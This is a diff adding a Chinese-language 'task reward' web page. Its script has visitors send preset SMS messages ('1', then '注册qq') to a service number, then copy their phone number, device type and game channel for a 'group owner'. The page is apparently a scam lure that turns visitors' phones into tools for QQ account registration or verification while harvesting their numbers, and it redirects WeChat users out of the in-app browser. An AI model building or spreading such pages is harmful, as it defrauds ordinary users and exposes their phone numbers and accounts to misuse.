@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>任务领取中心</title>
+    <style>
+        body {
+            font-family: Microsoft YaHei, sans-serif;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            background: #f5f5f5;
+        }
+        .banner {
+            border: 2px solid #ff4444;
+            padding: 15px;
+            margin: 20px 0;
+            background: #fff8e1;
+            border-radius: 10px;
+        }
+        .button {
+            padding: 12px 24px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        #step1 { background: #4CAF50; }
+        #step1:disabled { background: #cccccc; }
+        #step2 { background: #2196F3; }
+        #step2:disabled { background: #cccccc; }
+        #copyBtn { background: #9C27B0; }
+        select, input {
+            padding: 8px;
+            margin: 5px;
+            width: 200px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        .warning { color: red; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <h3>📢 任务公告</h3>
+        <p>▶ 完成以下内容领取拉满奖励</p>
+        <p>▶ 做完任务找群主发送：</p>
+        <p>✔ 您的手机号码</p>
+        <p>✔ 手机类型（苹果/安卓）</p>
+        <p>✔ 游戏渠道（4399/top/官服/苹果官服）</p>
+        <p>❗️发送信息完成第一时间截图发给我过时还要重新发以避免不必要的麻烦❗️<p>
+    </div>
+
+    <div id="wechatWarning" class="warning" style="display: none;">
+        ⚠ 检测到微信浏览器，请点击右上角使用系统浏览器打开！
+    </div>
+
+    <div>
+        <input type="tel" id="userPhone" placeholder="请输入您的手机号" pattern="[0-9]{11}">
+        <select id="channel">
+            <option value="">选择渠道</option>
+            <option>4399</option>
+            <option>top</option>
+            <option>官服</option>
+            <option>苹果官服</option>
+        </select>
+        <select id="deviceType">
+            <option value="">选择手机类型</option>
+            <option>苹果</option>
+            <option>安卓</option>
+        </select>
+    </div>
+
+    <button class="button" id="step1">第一步</button>
+    <button class="button" id="step2">第二步</button>
+    <button class="button" id="copyBtn">一键复制手机信息</button>
+
+    <script>
+        // 微信浏览器检测
+        if (/micromessenger/i.test(navigator.userAgent)) {
+            document.getElementById('wechatWarning').style.display = 'block';
+        }
+
+        // 短信配置
+        const SMS_SETTINGS = {
+            number: "106988881700511", // 国内服务号码格式
+            messages: {
+                step1: "1",
+                step2: "注册qq"
+            }
+        };
+
+        // 状态初始化
+        function initState() {
+            ['step1', 'step2'].forEach(step => {
+                if (!localStorage.getItem(step)) {
+                    localStorage.setItem(step, 'false');
+                }
+            });
+            document.getElementById('step2').disabled = 
+                localStorage.getItem('step1') === 'false';
+        }
+        initState();
+
+        // 短信发送核心方法
+        function handleSMSSending(step) {
+            try {
+                const content = SMS_SETTINGS.messages[`step${step}`];
+                const smsURI = `sms:${SMS_SETTINGS.number}?body=${encodeURIComponent(content)}`;
+                
+                // 优先尝试直接跳转
+                window.location.href = smsURI;
+                
+                // 兼容性备份方案
+                const backupSend = () => {
+                    const link = document.createElement('a');
+                    link.href = smsURI;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                };
+
+                // 双重触发机制
+                setTimeout(backupSend, 300);
+
+                // 更新任务状态
+                localStorage.setItem(`step${step}`, 'true');
+                document.getElementById(`step${step}`).disabled = true;
+                if(step === 1) {
+                    document.getElementById('step2').disabled = false;
+                }
+
+                // 发送状态检测
+                setTimeout(() => {
+                    if (!document.hidden) {
+                        const confirmMsg = [
+                            `短信发送到：${SMS_SETTINGS.number}`,
+                            `短信内容：${content}`,
+                            "点击确定复制信息到剪贴板"
+                        ].join("\n");
+                        
+                        if (confirm(confirmMsg)) {
+                            navigator.clipboard.writeText(`${SMS_SETTINGS.number} ${content}`);
+                        }
+                    }
+                }, 4500);
+
+            } catch (error) {
+                alert(`操作失败：${error.message}`);
+            }
+        }
+
+        // 事件绑定
+        document.getElementById('step1').addEventListener('click', () => handleSMSSending(1));
+        document.getElementById('step2').addEventListener('click', () => handleSMSSending(2));
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            const isValid = document.getElementById('userPhone').checkValidity();
+            const isComplete = localStorage.getItem('step1') === 'true' && 
+                              localStorage.getItem('step2') === 'true';
+
+            if (isValid && isComplete) {
+                const info = [
+                    `手机号：${document.getElementById('userPhone').value}`,
+                    `渠道：${document.getElementById('channel').value}`,
+                    `设备类型：${document.getElementById('deviceType').value}`
+                ].join("\n");
+
+                navigator.clipboard.writeText(info)
+                    .then(() => alert('复制成功！'))
+                    .catch(() => alert('自动复制失败，请手动选择文本复制'));
+            } else {
+                alert('请先完成所有步骤并正确填写信息！');
+            }
+        });
+    </script>
+</body>
+</html>
